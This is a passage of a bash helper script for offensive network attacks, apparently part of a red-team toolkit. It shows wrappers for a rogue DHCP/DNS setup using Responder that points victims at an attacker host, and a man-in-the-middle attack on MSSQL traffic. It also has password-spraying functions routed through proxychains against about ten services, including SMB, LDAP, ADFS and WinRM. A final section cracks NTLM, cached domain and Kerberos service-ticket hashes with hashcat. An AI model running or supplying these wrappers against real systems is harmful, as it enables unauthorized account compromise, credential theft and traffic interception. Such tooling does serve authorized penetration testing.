	TARGETDNS=$1;
	PORT=$2;
	ATTACKER=$3;
	echo 1 > /proc/sys/net/ipv4/ip_forward ;
	iptables -F;
	iptables -t nat -F;
	iptables -X;
	iptables -t nat \
	-A PREROUTING -p tcp \
	--destination-port $PORT \
	-j REDIRECT --to-port $PORT
	python /usr/share/responder/tools/DHCP.py \
	-I eth0 -d $TARGETDNS \
	-r $ATTACKER \
	-p 8.8.8.8 \
	-s 8.8.4.4 \
	-n 255.255.255.0 \
	-R -S;
	return;
}

function sqlMITM(){
    # DESCRIPTION: MITM attack against SQL/MSSQL services.
    # ARGUMENT: CLIENTIP, SERVERIP, BEGIN, END, QUERY.
    CLIENTIP=$1;
    SERVERIP=$2;
    BEGIN=$3;
    END=$4;
    QUERY=$5;
    python /opt/mitm/sqlmitm.py \
    --begin_keyword "$BEGIN" \
    --end_keyword "$END" \
    eth0 mssql \
     $CLIENTIP $SERVERIP "$QUERY";
    return;

}

function sprayHTTP(){
    # DESCRIPTION: Password spraying attack against HTTP.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/http_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayHTTPNTLM(){
    # DESCRIPTION: Password spraying attack against HTTP-NTLM.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/http_ntlm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayADFS(){
    # DESCRIPTION: Password spraying attack against ADFS.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/adfs_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayIMAP(){
    # DESCRIPTION: Password spraying attack against IMAP.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/imap_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayLDAP(){
    # DESCRIPTION: Password spraying attack against LDAP.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/ldap_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayMSSQL(){
    # DESCRIPTION: Password spraying attack against MSSQL.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/mssql_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayPSRM(){
    # DESCRIPTION: Password spraying attack against WinRM/PSRP.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/psrm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function spraySMB(){
    # DESCRIPTION: Password spraying attack against SMB.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/smb_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function spraySMTP(){
    # DESCRIPTION: Password spraying attack against SMTP.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/smtp_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayWinRM(){
    # DESCRIPTION: Password spraying attack against WinRM.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/winrm_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

function sprayWMI(){
    # DESCRIPTION: Password spraying attack against WMI.
    # ARGUMENT: TARGET, TARGETDOMAIN, DICTIONARY, TARGETPASSWORD.
    TARGET=$1;
    TARGETDOMAIN=$2;
    DICTIONARY=$3;
    TARGETPASSWORD=$4;
    proxychains \
    python /opt/spraying/wmi_spray.py \
    $TARGET $TARGETDOMAIN $DICTIONARY $TARGETPASSWORD;
    return;
}

# SECTION: Hash cracking helper functions:

function crackLMNT(){
    # DESCRIPTION: Crack LM/NT hashes.
    # ARGUMENT: TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 1000 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackNTLM1(){
    # DESCRIPTION: Crack NTLMv1 hashes.
    # ARGUMENT: TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 5500 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackNTLM2(){
    # DESCRIPTION: Crack NTLMv2 hashes.
    # ARGUMENT: TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 5600 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackCached2(){
    # DESCRIPTION: Crack ADv2 cached hashes.
    # ARGUMENT: TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 2100 -a 0 $TARGET $DICTIONARY --force
    return;
}

function crackSPNs(){
    # DESCRIPTION: Crack SPN hashes.
    # ARGUMENT: TARGET, DICTIONARY.
    TARGET=$1;
    DICTIONARY=$2;
    hashcat -m 13100 -a 0 $TARGET $DICTIONARY --force
    return;
}
